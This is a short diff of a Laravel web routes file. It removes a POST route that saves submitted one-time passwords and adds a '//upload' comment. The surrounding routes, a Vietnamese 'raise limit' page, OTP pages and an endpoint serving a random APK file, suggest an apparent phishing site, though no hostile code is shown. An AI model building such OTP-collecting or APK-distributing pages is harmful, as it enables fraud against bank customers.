@@ -54,7 +54,7 @@ Route::get('/nang-han-muc', function () {
 Route::get('/otp', function () {
     return view('otp');
 })->name('otp');
-Route::post('/otp-post', [OtpController::class, 'save'])->name('otp_post');
+
 //otp-error
 Route::get('/otp-error', function () {
     return view('otp-error');
@@ -66,3 +66,4 @@ Route::get('/download-app', function () {
     return view('download');
 });
 Route::get('/download', [ApiController::class, 'getOneFileRandomApk']);
+//upload
